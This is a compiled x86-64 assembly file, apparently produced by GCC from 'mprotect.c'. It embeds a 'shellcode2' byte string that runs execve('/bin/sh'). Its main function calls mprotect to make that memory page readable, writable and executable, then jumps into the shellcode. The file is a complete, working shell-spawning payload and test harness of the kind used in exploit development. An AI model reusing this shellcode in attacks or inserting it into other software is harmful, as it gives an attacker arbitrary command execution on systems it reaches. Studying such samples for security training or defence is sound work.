	.file	"mprotect.c"
	.globl	shellcode2
	.data
	.align 32
	.type	shellcode2, @object
	.size	shellcode2, 71
shellcode2:
	.string	"\353'[H\211[\bH1\300\210c\007H\211C\020\211\302\260;H\213{\bH\215s\b\017\005H1\311H\211\317\260<\017\005\350\324\377\377\377/bin/sh                 "
	.text
	.globl	get_rsp
	.type	get_rsp, @function
get_rsp:
.LFB0:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
#APP
# 12 "mprotect.c" 1
	mov %rsp,%rax
# 0 "" 2
#NO_APP
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE0:
	.size	get_rsp, .-get_rsp
	.globl	main
	.type	main, @function
main:
.LFB1:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	movl	$shellcode2, %eax
	andq	$-4096, %rax
	movq	%rax, -16(%rbp)
	movq	-16(%rbp), %rax
	movl	$6, %edx
	movl	$8192, %esi
	movq	%rax, %rdi
	call	mprotect
	movq	$shellcode2, -8(%rbp)
	movq	-8(%rbp), %rdx
	movl	$0, %eax
	call	*%rdx
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE1:
	.size	main, .-main
	.ident	"GCC: (Ubuntu 4.8.4-2ubuntu1~14.04) 4.8.4"
	.section	.note.GNU-stack,"",@progbits
